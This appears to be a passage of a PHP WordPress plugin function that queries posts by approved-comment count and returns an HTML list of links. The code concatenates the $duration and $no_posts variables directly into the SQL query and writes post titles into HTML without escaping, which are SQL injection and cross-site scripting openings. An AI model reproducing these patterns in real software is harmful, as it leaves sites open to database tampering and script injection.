	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		



?>
